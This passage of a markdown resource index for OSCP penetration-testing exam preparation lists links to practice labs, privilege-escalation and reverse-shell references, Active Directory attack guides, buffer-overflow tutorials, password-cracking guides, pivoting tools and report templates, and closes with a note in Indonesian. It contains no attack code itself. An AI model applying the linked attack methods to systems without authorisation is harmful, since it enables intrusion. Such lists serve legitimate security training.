| 34 | inspiretravel/OSCP | Structured OSCP notes covering all exam topics |
| 35 | devjanger/OSCP-CheatSheet | OSCP cheat sheet with privesc and methodology |
| 36 | radoi-teodor/OSCP-Methodology | OSCP methodology repository |
| 37 | ferreirasc/OSCP_study_guide | OSCP study guide with recommended books |
| 38 | jeffaf/oscp-prep-checklist | OSCP prep checklist — study plan & methodology |
| 39 | Karri390/Hackthebox-OSCP-prep | Writeups of HTB OSCP-like boxes |
| 40 | mouteee/oscp-enumeration | Enumeration guide covering web attacks |
| 41 | Themahdiesta/MahiestaPrivEsc | OSCP+ privilege escalation toolkit (140+ tools) |
| 42 | V1n1v131r4/OSCP-Buffer-Overflow | BOF cheat sheet for OSCP |
| 43 | 3isenHeiM/OSCP-BoF | 7-step BOF methodology with Python scripts |

### Machine Lists & Practice Platforms

| # | Resource | URL |
|---|----------|-----|
| 44 | TJ Null OSCP-Stuff | https://github.com/tjnull/OSCP-Stuff |
| 45 | TJ Null NetSecFocus Trophy Room | https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8 |
| 46 | Lainkusanagi OSCP Like List | https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt |
| 47 | 0xdf — OffSec HTB Lists | https://0xdf.gitlab.io/cheatsheets/offsec |
| 48 | Shellshock9001 — TJ Null + Difficulty | https://github.com/Shellshock9001/Tjs-Nulls-OSCP-list-in-order-from-easy-medium-hard |
| 49 | Hack The Box | https://www.hackthebox.com |
| 50 | TryHackMe | https://tryhackme.com |
| 51 | VulnHub | https://www.vulnhub.com |
| 52 | OffSec Proving Grounds | https://www.offsec.com/labs/individual |
| 53 | PentesterLab | https://pentesterlab.com |
| 54 | PortSwigger Web Security Academy | https://portswigger.net/web-security |
| 55 | OWASP Juice Shop | https://owasp.org/www-project-juice-shop/ |
| 56 | OverTheWire | https://overthewire.org |
| 57 | HTB Academy | https://academy.hackthebox.com |
| 58 | GOAD (Game of Active Directory) | https://github.com/Orange-Cyberdefense/GOAD |

### Privilege Escalation References

| # | Resource | URL |
|---|----------|-----|
| 59 | GTFOBins | https://gtfobins.github.io |
| 60 | LOLBAS | https://lolbas-project.github.io |
| 61 | HackTricks | https://book.hacktricks.xyz |
| 62 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| 63 | RevShells.com | https://www.revshells.com |
| 64 | Hack The Dome — Linux Privesc | https://hackthedome.com/oscp-survival-guide-2025-the-ultimate-linux-privilege-escalation-cheat-sheet/ |
| 65 | FuzzySecurity — Windows Privesc | http://www.fuzzysecurity.com/tutorials/16.html |
| 66 | g0tmi1k — Linux Privesc | https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ |

### Active Directory

| # | Resource | URL |
|---|----------|-----|
| 67 | SpecterOps — Certified Pre-Owned (AD CS) | https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf |
| 68 | Redfoxsec — Exploiting AD CS | https://www.redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs |
| 69 | shahidshaik786 — AD Attacks CRTP OSCP | https://github.com/shahidshaik786/ActiveDirectory_Attacks_CRTP_OSCP |
| 70 | Victor Abiodun — ESC Misconfigurations | https://medium.com/@3xploit/attacking-active-directory-certificate-services-a-complete-guide-to-esc-misconfigurations-4b1ecb75c54b |
| 71 | gl0bal01 — AD Pentesting SOP | https://github.com/gl0bal01/intel-codex/blob/main/Security/Pentesting/sop-ad-pentest.md |
| 72 | Cavementech — AD Quick Reference | https://notes.cavementech.com/pentesting-quick-reference/active-directory |
| 73 | Orange Cyberdefense — Mindmaps | https://orange-cyberdefense.github.io/ocd-mindmaps/ |

### Buffer Overflow

| # | Resource | URL |
|---|----------|-----|
| 74 | RGROSEC — BOF Pt.1 (Theory) | https://www.rgrosec.com/post/2022-02-25-x86-windows-buffer-overflow-pt1.html |
| 75 | RGROSEC — BOF Pt.2 (Exploitation) | https://www.rgrosec.com/post/2022-02-25-x86-windows-buffer-overflow-pt2.html |
| 76 | Steflan — Complete BOF Guide | https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/ |
| 77 | Coalfire — x86-64 BOF | https://coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-5-x86-64-buffer |
| 78 | Dev.to — x64 Windows BOF Pt.1 | https://dev.to/mirrai/buffer-overflows-on-x64-windows-a-practical-beginners-guide-part-1-setting-up-mde |
| 79 | Corelan Security Tutorials | https://www.corelan.be/ |
| 80 | dostackbufferoverflowgood | https://github.com/justinsteven/dostackbufferoverflowgood |

### Web Application Attacks

| # | Resource | URL |
|---|----------|-----|
| 81 | guif.re — Web Testing on OSCP | https://guif.re/webtesting |
| 82 | securing.dev — Hacking the OSCP Web Apps | https://securingdev.github.io/posts/hacking-the-oscp-web-apps/ |
| 83 | Cybersecurity Institute — Web Exploitation | https://www.cybersecurityinstitute.in/blog/oscp-web-exploitation-guide-sqli-lfi-rce-file-upload-attacks-explained |
| 84 | Alejandro Espinosa — OSCPath Week 2 | https://amtzespinosa.github.io/posts/oscpath-week-2-web-application-attacks/ |
| 85 | vimalraj-sec — Web App Pentesting | https://github.com/vimalraj-sec/web-app-pentesting |

### Report Templates

| # | Resource | URL |
|---|----------|-----|
| 86 | whoisflynn — OSCP Report Template | https://github.com/whoisflynn/OSCP-Exam-Report-Template |
| 87 | noraj/ret2src — Markdown Template | https://github.com/ret2src/OSCP-Exam-Report-Template-Markdown |
| 88 | ohydra — LaTeX Report Template | https://github.com/ohydra/OSCP-Report-Template |
| 89 | PlatyPew — Report Generator | https://github.com/PlatyPew/OSCP-Report-Generator |
| 90 | chvancooten — Markdown Reporting | https://github.com/chvancooten/OSCP-MarkdownReportingTemplates |
| 91 | opsec-infosec — Report Template | https://github.com/opsec-infosec/OSCP-Exam-Report-Template |
| 92 | chrisbensch — Report Template | https://github.com/chrisbensch/OSCP-Exam-Report-Template |
| 93 | mz-zarei — Report Template | https://github.com/mz-zarei/OSCP-Exam-Report-Template |

### Password Cracking

| # | Resource | URL |
|---|----------|-----|
| 94 | ComputingForgeeks — Hashcat & John | https://computingforgeeks.com/password-cracking-hashcat-john-kali/ |
| 95 | sushant747 — Total OSCP Guide | https://sushant747.gitbooks.io/total-oscp-guide/content/identify_hash_and_crack_it.html |
| 96 | Hashcat Wiki — Rule-Based Attack | https://hashcat.net/wiki/doku.php?id=rule_based_attack |
| 97 | John the Ripper — RULES doc | https://github.com/openwall/john/blob/65368cc0/doc/RULES |
| 98 | John the Ripper — MODES doc | https://github.com/openwall/john/blob/65368cc0/doc/MODES |
| 99 | Hashcat Rule-Based Attacks Guide | https://tutorials.technology/tutorials/hashcat-rule-based-attack.html |
| 100 | Hashcat Advanced Techniques | https://tutorials.technology/tutorials/hashcat-advanced-techniques-2026.html |

### Pivoting

| # | Resource | URL |
|---|----------|-----|
| 101 | Asif Nawaz — Chisel & Ligolo-ng | https://www.asifnawazminhas.com/posts/pivoting-port-forwarding/ |
| 102 | MayanSuthar/Pivoting | https://github.com/MayanSuthar/Pivoting |
| 103 | System Weakness — All about Pivoting | https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2 |
| 104 | Dev.to — Pivoting & Tunneling 2026 | https://dev.to/lucky_lonerusher/pivoting-tunneling-2026-chisel-ligolo-ng-ssh-tunnels-socks5-through-victims-hacking-151m |
| 105 | NordbySec — Ligolo-NG Tutorial | https://nordbysec.com/2025/04/13/pivoting-through-the-network-the-power-of-ligolo-ng/ |
| 106 | SDNTechForum — Lateral Movement | https://medium.com/@sdntechdemo/11-kali-linux-lateral-movement-traversing-the-network-a9852bbf64a8 |

### Books

| # | Book | Author |
|---|------|--------|
| 107 | Penetration Testing: A Hands-On Introduction | Georgia Weidman |
| 108 | The Hacker Playbook 3 | Peter Kim |
| 109 | The Web Application Hacker's Handbook (2nd Ed.) | Stuttard & Pinto |
| 110 | Black Hat Python (2nd Ed.) | Justin Seitz & Tim Arnold |
| 111 | RTFM: Red Team Field Manual v2 | Ben Clark & Nick Downer |
| 112 | Hacking: The Art of Exploitation (2nd Ed.) | Jon Erickson |
| 113 | Metasploit: The Penetration Tester's Guide | David Kennedy et al. |
| 114 | Linux Basics for Hackers | OccupyTheWeb |

### YouTube Channels

| # | Channel | Focus |
|---|---------|-------|
| 115 | IppSec | HTB walkthroughs, OSCP prep playlist |
| 116 | John Hammond | General hacking, CTF walkthroughs |
| 117 | S1REN | OSCP-focused content |
| 118 | Motasem Hamdan | OSCP Course 2024 |
| 119 | TCM Security | Practical Ethical Hacking, PNPT prep |
| 120 | OffSec Official | Exam tips, community content |
| 121 | Stanford CS253 (Web Security) | Web security fundamentals |

### Communities & Forums

| # | Resource | URL |
|---|----------|-----|
| 122 | r/oscp Reddit | https://reddit.com/r/oscp |
| 123 | OffSec Discord | https://discord.gg/offsec |
| 124 | OffSec Community Forums | https://forums.offsec.com |

### Practice Machine Writeups

| # | Source | URL (if applicable) |
|---|--------|---------------------|
| 125 | 0xdf GitLab — HTB Writeups | https://0xdf.gitlab.io |
| 126 | SilentExploit — PG Walkthroughs | Medium: RubyDome, OutDated |
| 127 | Fehzan Vayani — PG Resourced | Medium OSCP writeup |
| 128 | Aaronashley — PG Lampiao | Medium OSCP prep |
| 129 | Aslam Mahimkar — PG Play | Medium: InfosecPrep, FunboxEasyEnum |
| 130 | Abacu5 — VulnHub OSCP | Medium: VulnHub OSCP writeup |
| 131 | Md Nuhas Mahmud — InfoSec Prep | Medium: VulnHub walkthrough |

### Miscellaneous

| # | Resource | Deskripsi |
|---|----------|-----------|
| 132 | HackTricks — Linux Privesc | https://book.hacktricks.xyz |
| 133 | HackTricks — Windows Privesc | https://book.hacktricks.xyz |
| 134 | HackTricks — AD Methodology | https://book.hacktricks.xyz |
| 135 | CTF Note-Taking Template | https://411hall.github.io/assets/files/CTF_template.ctb |
| 136 | TJ Joplin Pentest Template | https://github.com/tjnull/TJ-JPT |
| 137 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| 138 | Orange Cyberdefense Mindmaps | https://orange-cyberdefense.github.io/ocd-mindmaps/ |
| 139 | Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester |
| 140 | Windows Exploit Suggester | https://github.com/AonCyberLabs/Windows-Exploit-Suggester |
| 141 | Certipy — AD CS Tool | https://github.com/ly4k/Certipy |
| 142 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
| 143 | NetExec | https://github.com/Pennyw0rth/NetExec |
| 144 | Impacket Suite | https://github.com/fortra/impacket |
| 145 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |

---

> **Catatan Akhir**: OSCP bukan tes kecerdasan — ini tes konsistensi, metodologi, dan ketahanan mental. Latih pattern recognition melalui repetisi, bangun metodologi yang repeatable, dokumentasi seperti profesional, dan ingat: ketika stuck, kembali ke basics — ports, versions, files, credentials, permissions, paths, users, groups, services, shares, logs, dan trust relationships.
